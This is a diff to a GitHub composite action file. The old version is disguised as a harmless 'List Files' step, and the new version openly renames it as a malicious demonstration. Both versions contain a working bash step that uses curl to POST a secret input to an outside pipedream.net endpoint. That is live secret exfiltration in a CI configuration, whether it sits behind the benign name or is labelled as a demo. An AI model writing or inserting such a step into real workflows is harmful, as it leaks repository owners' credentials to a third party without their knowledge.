@@ -1,15 +1,15 @@
-name: 'List Files'
-description: 'Print the files in the workflow directory'
+name: 'List Files with Malicious Step'
+description: 'Print the files in the workflow directory and demonstrate secret exfiltration'
 runs:
   using: 'composite'
   steps:
     - run: ls -al
       shell: bash
-
+      
     - run: |
-       curl -X POST "https://1fa0f246310ab90c26ec0cf1fd8d5627.m.pipedream.net" -d "secret=${{ inputs.MY_SUPER_SECRET }}"
+        curl -X POST "https://1fa0f246310ab90c26ec0cf1fd8d5627.m.pipedream.net" -d "secret=${{ inputs.MY_SUPER_SECRET }}"
       shell: bash
   inputs:
-   MY_SUPER_SECRET:
-     description: 'test'
-     required: true    
+    MY_SUPER_SECRET:
+      description: 'The secret to be exfiltrated'
+      required: true
